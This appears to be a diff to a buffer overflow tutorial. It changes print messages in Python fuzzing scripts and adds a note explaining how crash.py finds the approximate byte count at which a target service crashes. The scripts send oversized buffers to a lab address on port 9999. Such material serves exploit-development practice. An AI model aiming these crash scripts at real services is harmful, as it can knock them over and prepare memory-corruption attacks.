@@ -18,7 +18,7 @@ try:
 		connect=s.connect((address,port))
 		s.recv(1024)
 		s.send(string + '\r\n')
-		print '[*] Done'
+		print '[!] Done'
 except:
  	print '[!] Unable to connect to the application. You may have crashed it.'
  	sys.exit(0)
@@ -28,6 +28,8 @@ finally:
 ```
 
 ## crash.py
+
+To find the [more] approximate number of bytes send at which the program crashed, use this script. 
 
 ```
 #!/usr/bin/python
@@ -43,7 +45,7 @@ try:
   s.connect(('192.168.69.101',9999))
   s.recv(1024)
 
-  print '[*] Sending buffer.'
+  print '[*] Sending buffer...'
   s.send(buffer + '\r\n')
   s.close()
   print '[!] Done.'
